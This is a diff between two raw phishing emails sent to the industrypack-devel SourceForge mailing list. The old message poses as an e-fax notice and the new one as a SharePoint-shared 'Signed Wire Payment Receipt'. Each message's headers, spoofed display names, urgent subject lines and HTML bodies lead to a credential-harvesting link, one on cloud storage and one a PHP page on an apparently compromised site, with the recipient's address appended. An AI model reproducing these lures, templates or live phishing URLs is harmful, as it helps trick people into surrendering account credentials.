@@ -2,54 +2,54 @@ Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
 X-Original-To: lists+industrypack-devel@lfdr.de
 Delivered-To: lists+industrypack-devel@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id B30D54745FA
-	for <lists+industrypack-devel@lfdr.de>; Tue, 14 Dec 2021 16:06:28 +0100 (CET)
-Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
-	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
+	by mail.lfdr.de (Postfix) with ESMTPS id D945D477A06
+	for <lists+industrypack-devel@lfdr.de>; Thu, 16 Dec 2021 18:10:18 +0100 (CET)
+Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
+	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
 	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
-	id 1mx9Nq-0005kg-QC
-	for lists+industrypack-devel@lfdr.de; Tue, 14 Dec 2021 15:06:26 +0000
+	id 1mxuGm-0002BC-Am
+	for lists+industrypack-devel@lfdr.de; Thu, 16 Dec 2021 17:10:17 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
- by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
- (envelope-from <plainstup@mineralexpertse.com>) id 1mx9Np-0005ka-KS
- for industrypack-devel@lists.sourceforge.net; Tue, 14 Dec 2021 15:06:25 +0000
+ (envelope-from <olivantun@vipegroup.com>) id 1mxuGl-0002B6-5w
+ for industrypack-devel@lists.sourceforge.net; Thu, 16 Dec 2021 17:10:16 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
  d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
  Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=iCSNH50lWQmV0rYfdP4pFFZuCN3zkOTWeB32kZDlvdk=; b=PxABicVttbMHd1u0rEPMuFDoOk
- m3oDuJY49lfP07KIUeV9eK7I2jZcPYgYXtsXDwM68e5A1+kRT9Aj2d+8zj4PaJ1/G7+NkRj7XLO9x
- PvRpjj1ds6imu4qI1WaGrpoA2QvPM81CLXOOM/HKMZGDiFrjrSyHBf1BwHk5erBAYPyM=;
+ bh=hFiEuCMyN2wRh9UbCrfkMkiK+IO/oVckvGpPMoLqi78=; b=Nn78VtkdIPJ0gcX22fPjgRNGgf
+ SOC2ZaQ1mAZ0W1TlNBVTdCr0leCsNtndX2OuNN+spVclxHiktTIZE7G6SCkNq4V/YvSHm96pEdyKX
+ QqP+RMWvLsqWiaruGQLT1qY+D+XYW97fGhDORdnRXg1SDpqh6te2u2L1XiVvN947d3M0=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
  h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
  :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
  Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=iCSNH50lWQmV0rYfdP4pFFZuCN3zkOTWeB32kZDlvdk=; b=f
- 1JHdvBcPS1ve5+Je14voCXPOhCbglxFZf4wlIVMjquPIcTng3I6A8ULgYUgzsqBwrmscqRzga9SH+
- 5I6DPc1fNALx0gWcXt4g33TOUy3kTALmxikiavPQ99uHFq3d17UahoAsHvcnh7MT0t3i8B2y359EY
- i7BVvTbexdy825Fs=;
-Received: from [143.198.228.154] (helo=mta0.mineralexpertse.com)
+ List-Owner:List-Archive; bh=hFiEuCMyN2wRh9UbCrfkMkiK+IO/oVckvGpPMoLqi78=; b=f
+ TIkxicHCyUW3zdNP66QKXTbJHSPenS8VCDdWGvHwcL9jP0apF9n5cDhAaAwYI4Vg7DcYhxCOW9wv6
+ 8vjgrv9Psec2CvZZTI2yJLHK2iI6n3lfWBhmBb5BdWdVTg5FsieXve1qVQOzub+A344kZ7uPYsyzw
+ 1oyuwN5BAfWdxsgU=;
+Received: from [207.154.236.86] (helo=mta0.vipegroup.com)
  by sfi-mx-1.v28.lw.sourceforge.com with esmtps
  (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
- id 1mx9Np-00FEhG-0d
- for industrypack-devel@lists.sourceforge.net; Tue, 14 Dec 2021 15:06:25 +0000
+ id 1mxuGl-000AGT-J5
+ for industrypack-devel@lists.sourceforge.net; Thu, 16 Dec 2021 17:10:16 +0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
- d=mineralexpertse.com; 
+ d=vipegroup.com; 
  h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id;
- i=plainstup@mineralexpertse.com;
- bh=iCSNH50lWQmV0rYfdP4pFFZuCN3zkOTWeB32kZDlvdk=;
- b=XEmBQKFITMNfvt3V4S2LaP5uIDAlypbnmSsxlcCzR+g6FTYNdQAXHXYOAQ9/L4ls6izR/xQA86Pa
- mjuMT7VFU8bsdkFQwEIBGCoU4QGrfGu2Txrfxe2qGQz8n6bsAzeT4soRUEMAWO0VBWpVkuSHLyJl
- ye/6V13vLmuaRSxcuWo=
+ i=olivantun@vipegroup.com;
+ bh=hFiEuCMyN2wRh9UbCrfkMkiK+IO/oVckvGpPMoLqi78=;
+ b=eUf9WPBy6RcF6cInbb9eghxT2AFHrt23O6UJU22LjfHHxPDrts0VaePm68uN5qy0mqo5ZCdUb4BQ
+ zZkNa8ihMf+pk5PJ3lEMgoa5jXa/0DU0Oc36F/ObzGzcZnH4BWn8Ea8hTgttTR2Hx56nv2HiyGYp
+ HEHLaOdWspnHzsFxvaE=
 To: <industrypack-devel@lists.sourceforge.net>
 MIME-Version: 1.0
-Date: Tue, 14 Dec 2021 15:06:19 +0000
-Message-Id: <14192021120615BBDAD27D1E-45D5A5F570@mineralexpertse.com>
+Date: Thu, 16 Dec 2021 17:10:08 +0000
+Message-Id: <20211612171008E5DE9796CB-57E6E75E96@vipegroup.com>
 X-Spam-Score: 1.1 (+)
 X-Spam-Report: Spam detection software,
  running on the system "util-spamd-1.v13.lw.sourceforge.com", 
@@ -57,9 +57,11 @@ X-Spam-Report: Spam detection software,
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview: Lists.sourceforge.net Confi Fax Center You have received new
- e-Fax attachment from 419 680-XXXX on Tuesday, December 14, 2021 Received
- Pages 2 Content analysis details:   (1.1 points, 6.0 required)
+ Content preview: Lists.sourceforge.net INC Lists.sourceforge.net Share
+ Document
+ on SharePoint group payment@Lists.sourceforge.nethas new document for you
+ All Company 
+ Content analysis details:   (1.1 points, 6.0 required)
  pts rule name              description
  ---- ---------------------- --------------------------------------------------
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
@@ -72,9 +74,11 @@ X-Spam-Report: Spam detection software,
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
  valid
  -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
+ -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
+ [207.154.236.86 listed in wl.mailspike.net]
  1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
-X-Headers-End: 1mx9Np-00FEhG-0d
-Subject: [Industrypack-devel] Approval Required To Preview Vital E-Fax Docs#
+X-Headers-End: 1mxuGl-000AGT-J5
+Subject: [Industrypack-devel] Mandatory Authroziation Required!!
 X-BeenThere: industrypack-devel@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -86,45 +90,42 @@ List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
 List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
  <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
-From: "Lists.sourceforge.net|E-Fax Approval71076680a1f5e4b8c8f42a1b0bb9c33f
- via Industrypack-devel" <industrypack-devel@lists.sourceforge.net>
-Reply-To: "Lists.sourceforge.net|E-Fax
- Approval71076680a1f5e4b8c8f42a1b0bb9c33f" <plainstup@mineralexpertse.com>
-Content-Type: multipart/mixed; boundary="===============9019878415541337171=="
+From: "Lists.sourceforge.net|Vital Auth via Industrypack-devel"
+ <industrypack-devel@lists.sourceforge.net>
+Reply-To: "Lists.sourceforge.net|Vital Auth" <olivantun@vipegroup.com>
+Content-Type: multipart/mixed; boundary="===============5716277374453841136=="
 Errors-To: industrypack-devel-bounces@lists.sourceforge.net
 
 This is a multi-part message in MIME format
 
---===============9019878415541337171==
-Content-Type: multipart/alternative; boundary="JvViEBSuJ2xs1c=_WmHDNGwapc7ZyEXp2b"
+--===============5716277374453841136==
+Content-Type: multipart/alternative; boundary="NKmqIbmFRF2QSqcgAW9d2UU1FVBq=_net1"
 
 This is a multi-part message in MIME format
 
---JvViEBSuJ2xs1c=_WmHDNGwapc7ZyEXp2b
+--NKmqIbmFRF2QSqcgAW9d2UU1FVBq=_net1
 Content-Type: text/plain; charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
 
-Lists.sourceforge.net Confi Fax Center
+Lists.sourceforge.net INC
+Lists.sourceforge.net Share Document on SharePoint group
 
-You have received new e-Fax attachment from 419 680-XXXX on Tuesday, D=
-ecember 14, 2021
+payment@Lists.sourceforge.nethas new document for you=20
 
-Received Pages 2
 
-File Type: PDF
+All Company
 
-File Name: P.O Contract (0.98mb)
+12/16/2021
+# VALERO ENERGY "Signed Wire Payment Receipt.pdf"
+( grant required permissions to view this document )
 
-Reference: Payment-e-receipt-A210-4590-675.pdf
+GRANT ACCESS TO PREVIEW DOCUMENTS https://relevantlogic.com/glassandgl=
+aze/wp_includesss/bodsanfr/wp_includess/bonfire/offficees/balaoldlldoo=
+diil/plononswertio.php?blendonsawerpoiu=3Dindustrypack-devel@lists.sou=
+rceforge.net
 
-To view your message ?=20
-
-Click Here To View E-Fax Securely https://storage.cloud.google.com/mai=
-ntainancecomponeta.appspot.com/sydlasguygendom.html#industrypack-devel=
-@lists.sourceforge.net
-
---JvViEBSuJ2xs1c=_WmHDNGwapc7ZyEXp2b
+--NKmqIbmFRF2QSqcgAW9d2UU1FVBq=_net1
 Content-Type: text/html; charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
@@ -133,43 +134,91 @@ Content-Transfer-Encoding: quoted-printable
 <meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
 8859-1">
   <META name=3Dviewport content=3D"width=3Ddevice-width, initial-scale=
-=3D1"> <META name=3Dformat-detection content=3Dtelephone=3Dno> <title>=
-Approval Required To Preview Vital E-Fax Docs#</title>
+=3D1"> <META name=3Dformat-detection content=3Dtelephone=3Dno><title>M=
+andatory Authroziation Required!!</title>
  </head>
  <body style=3D"BACKGROUND-COLOR: #ffffff" bgColor=3D#ffffff> <P align=
-=3Dleft><FONT size=3D3 face=3DArial>&nbsp;&nbsp;<FONT face=3D"Times Ne=
-w Roman"> </FONT></p><p><STRONG><SPAN style=3D"COLOR: #2f4f4f"><SPAN s=
-tyle=3D"FONT-SIZE: 72px"><SPAN style=3D"FONT-SIZE: 48px">Lists.sourcef=
-orge.net&nbsp;Confi Fax Center</SPAN></SPAN></SPAN></STRONG></p><p><SP=
-AN style=3D"FONT-SIZE: 22px">You have received new e-Fax attachment fr=
-om 419 680-XXXX on Tuesday, December 14, 2021</SPAN></p><p><SPAN style=
-=3D"FONT-SIZE: 22px">Received Pages 2</SPAN></p><p><SPAN style=3D"FONT=
--SIZE: 22px">File Type: PDF</SPAN></p><p><SPAN style=3D"FONT-SIZE: 22p=
-x">File Name: P.O Contract (0.98mb)</SPAN></p><p><SPAN style=3D"FONT-S=
-IZE: 22px">Reference: Payment-e-receipt-A210-4590-675.pdf</SPAN></p><p=
-><SPAN style=3D"FONT-SIZE: 22px">To view your message&nbsp; &nbsp; </S=
-PAN><SPAN style=3D'FONT-SIZE: 16px; FONT-FAMILY: "pingfang sc", "helve=
-tica neue", arial, "hiragino sans gb", "microsoft yahei ui", "microsof=
-t yahei", simsun, sans-serif; COLOR: rgb(85,85,85); BACKGROUND-COLOR: =
-rgb(245,245,245)'>&#8594;</SPAN><SPAN style=3D"FONT-SIZE: 22px">&nbsp;=
- &nbsp;<U><A href=3D"https://storage.cloud.google.com/maintainancecomp=
-oneta.appspot.com/sydlasguygendom.html#industrypack-devel@lists.source=
-forge.net"><SPAN style=3D"COLOR: #2f4f4f">Click Here To View E-Fax Sec=
-urely</SPAN></A></U></SPAN></p><p>&nbsp;</P></FONT></body>
+=3Dleft><FONT size=3D3 face=3DArial>&nbsp;</P> <CENTER data-link-color=
+=3D"#1188E6" data-body-style=3D"font-size:14px; font-family:arial,helv=
+etica,sans-serif; color:#000000; background-color:#FFFFFF;"> <DIV></FO=
+NT><table cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ff=
+ffff border=3D0> <tr><td bgColor=3D#ffffff vAlign=3Dtop width=3D"100%"=
+><table role=3Dcontent-container cellSpacing=3D0 cellPadding=3D0 width=
+=3D"100%" align=3Dcenter border=3D0> <tr><td width=3D"100%"><table cel=
+lSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0> <tr><td><table=
+ style=3D"MAX-WIDTH: 600px; WIDTH: 100%" cellSpacing=3D0 cellPadding=3D=
+0 width=3D"100%" align=3Dcenter border=3D0> <tr><td role=3Dmodules-con=
+tainer style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
+px; PADDING-RIGHT: 0px" bgColor=3D#ffffff width=3D"100%" align=3Dleft>=
+<table role=3Dmodule style=3D"TABLE-LAYOUT: fixed" cellSpacing=3D0 cel=
+lPadding=3D0 width=3D"100%" border=3D0 data-type=3D"text" data-muid=3D=
+"538286a3-fc8d-4d88-b117-b7c636d370c7" data-mc-module-version=3D"2019-=
+10-22"> <tr><td role=3Dmodule-content style=3D"PADDING-BOTTOM: 0px; PA=
+DDING-TOP: 18px; PADDING-LEFT: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: =
+0px" bgColor=3D#ffffff height=3D"100%" vAlign=3Dtop><FONT size=3D3 fac=
+e=3DArial> <DIV style=3D"FONT-FAMILY: inherit"><SPAN style=3D"FONT-SIZ=
+E: 12px; COLOR: rgb(175,175,175)">Lists.sourceforge.net&nbsp;INC</SPAN=
+><BR><BR><SPAN style=3D"FONT-SIZE: 24px">Lists.sourceforge.net Share D=
+ocument &nbsp;on SharePoint group</SPAN></DIV> <DIV style=3D"FONT-FAMI=
+LY: inherit">&nbsp;</DIV> <DIV style=3D"FONT-FAMILY: inherit"><SPAN st=
+yle=3D"FONT-SIZE: 14px">&nbsp;<A href=3D"payment@Lists.sourceforge.net=
+&nbsp;has new document for you&nbsp;</SPAN></DIV> <DIV style=3D" inher=
+it? FONT-FAMILY:></DIV> <DIV style=3D"FONT-FAMILY: inherit"><SPAN styl=
+e=3D"FONT-SIZE: 14px; COLOR: rgb(33,125,177)"><STRONG>All Company</STR=
+ONG></SPAN></DIV> <DIV>&nbsp;</DIV></FONT></A></SPAN></TD></TR></TABLE=
+><table role=3Dmodule style=3D"TABLE-LAYOUT: fixed" cellSpacing=3D0 ce=
+llPadding=3D0 width=3D"100%" border=3D0 data-type=3D"divider" data-mui=
+d=3D"12ab527b-44a2-4c07-b7b4-03cdb98808aa"> <tr><td role=3Dmodule-cont=
+ent style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
+ PADDING-RIGHT: 0px" height=3D"100%" vAlign=3Dtop><table style=3D"FONT=
+-SIZE: 5px; LINE-HEIGHT: 5px" height=3D5 cellSpacing=3D0 cellPadding=3D=
+0 width=3D"100%" align=3Dcenter border=3D0> <tr><td style=3D"PADDING-B=
+OTTOM: 5px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" b=
+gColor=3D#217db1><FONT size=3D3 face=3DArial>&nbsp;</FONT></TD></TR></=
+TABLE></TD></TR></TABLE><table role=3Dmodule style=3D"TABLE-LAYOUT: fi=
+xed" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0 data-ty=
+pe=3D"text" data-muid=3D"28265873-78d6-4ba5-b6c0-8f33e480a5ca"> <tr><t=
+d role=3Dmodule-content style=3D"PADDING-BOTTOM: 18px; PADDING-TOP: 18=
+px; PADDING-LEFT: 30px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" height=3D=
+"100%" vAlign=3Dtop><FONT size=3D3 face=3DArial> <DIV style=3D"FONT-FA=
+MILY: inherit"><STRONG>12/16/2021</STRONG><BR><BR>#&nbsp;VALERO ENERGY=
+&nbsp;"<STRONG>Signed Wire Payment&nbsp;&nbsp;Receipt.pdf</STRONG>"<BR=
+><BR>(&nbsp;grant required permissions &nbsp;to view this document )</=
+DIV> <DIV>&nbsp;</DIV></FONT></TD></TR></TABLE><table role=3Dmodule st=
+yle=3D"TABLE-LAYOUT: fixed" cellSpacing=3D0 cellPadding=3D0 width=3D"1=
+00%" border=3D0 data-type=3D"button" data-muid=3D"dc16cec2-70ed-4509-8=
+819-66afbcba9aaa" data-role=3D"module-button"> <tr><td style=3D"PADDIN=
+G-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px=
+" align=3Dcenter><table cellSpacing=3D0 cellPadding=3D0 border=3D0> <t=
+r><td style=3D"FONT-SIZE: 16px; TEXT-ALIGN: center; border-radius: 6px=
+" bgColor=3D#3898d9 align=3Dcenter><FONT size=3D3 face=3DArial><A styl=
+e=3D"FONT-SIZE: 14px; BORDER-TOP: rgb(56,152,217) 1px solid; BORDER-RI=
+GHT: rgb(56,152,217) 1px solid; BORDER-BOTTOM: rgb(56,152,217) 1px sol=
+id; COLOR: rgb(255,255,255); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; =
+PADDING-LEFT: 18px; BORDER-LEFT: rgb(56,152,217) 1px solid; DISPLAY: i=
+nline-block; LINE-HEIGHT: 7px; PADDING-RIGHT: 18px; BACKGROUND-COLOR: =
+rgb(56,152,217); border-radius: 0px; text-decoration-line: none" href=3D=
+"https://relevantlogic.com/glassandglaze/wp_includesss/bodsanfr/wp_inc=
+ludess/bonfire/offficees/balaoldlldoodiil/plononswertio.php?blendonsaw=
+erpoiu=3Dindustrypack-devel@lists.sourceforge.net" target=3D_blank>GRA=
+NT ACCESS TO PREVIEW DOCUMENTS</A></FONT></TD></TR></TABLE></TD></TR><=
+/TABLE></TD></TR></TABLE></TD></TR></TABLE></TD></TR></TABLE></TD></TR=
+></TABLE><FONT size=3D3 face=3DArial></DIV></CENTER> <P>&nbsp; &nbsp; =
+&nbsp; &nbsp;&nbsp;</p><p align=3Dleft>&nbsp;&nbsp;</FONT></P></body>
  </html>
 
---JvViEBSuJ2xs1c=_WmHDNGwapc7ZyEXp2b--
+--NKmqIbmFRF2QSqcgAW9d2UU1FVBq=_net1--
 
 
 
---===============9019878415541337171==
+--===============5716277374453841136==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============9019878415541337171==
+--===============5716277374453841136==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -180,6 +229,6 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============9019878415541337171==--
+--===============5716277374453841136==--
 
 
